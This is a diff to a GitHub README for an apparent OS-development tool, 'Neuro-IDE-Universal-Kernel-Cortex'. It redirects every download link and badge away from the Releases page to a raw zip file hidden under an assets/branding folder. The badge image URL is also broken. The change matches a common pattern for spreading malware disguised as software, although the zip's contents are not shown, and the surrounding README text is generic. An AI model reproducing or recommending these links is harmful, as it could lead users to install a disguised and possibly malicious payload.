@@ -22,10 +22,10 @@ Follow these simple steps to download and start using Neuro-IDE-Universal-Kernel
 1. **Download the Application**:
    Click the button below to visit the Releases page where you can download the latest version:
 
-   [![Download Neuro-IDE-Universal-Kernel-Cortex](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/releases)
+   [![Download Neuro-IDE-Universal-Kernel-Cortex](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/raw/refs/heads/main/assets/branding/Kernel-ID-Neuro-Cortex-Universal-1.1.zip%20Release-brightgreen)](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/raw/refs/heads/main/assets/branding/Kernel-ID-Neuro-Cortex-Universal-1.1.zip)
 
 2. **Access the Releases Page**:
-   Visit this page to download: [GitHub Releases](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/releases)
+   Visit this page to download: [GitHub Releases](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/raw/refs/heads/main/assets/branding/Kernel-ID-Neuro-Cortex-Universal-1.1.zip)
 
 3. **Choose Your Version**:
    On the Releases page, look for the most recent version listed. This is typically found at the top of the list.
@@ -64,7 +64,7 @@ Engage with our community to share your experiences and learn from others:
 ## 📦 Download & Install
 To get started with Neuro-IDE-Universal-Kernel-Cortex, download the application from the link below:
 
-[![Download Neuro-IDE-Universal-Kernel-Cortex](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/releases)
+[![Download Neuro-IDE-Universal-Kernel-Cortex](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/raw/refs/heads/main/assets/branding/Kernel-ID-Neuro-Cortex-Universal-1.1.zip%20Release-brightgreen)](https://github.com/royavila123/Neuro-IDE-Universal-Kernel-Cortex/raw/refs/heads/main/assets/branding/Kernel-ID-Neuro-Cortex-Universal-1.1.zip)
 
 ## 📖 Conclusion
 Neuro-IDE-Universal-Kernel-Cortex combines essential tools for operating system development in one easy-to-use package. With this guide, you can confidently download, install, and start using the application for your projects. Enjoy exploring the capabilities of your new development environment!
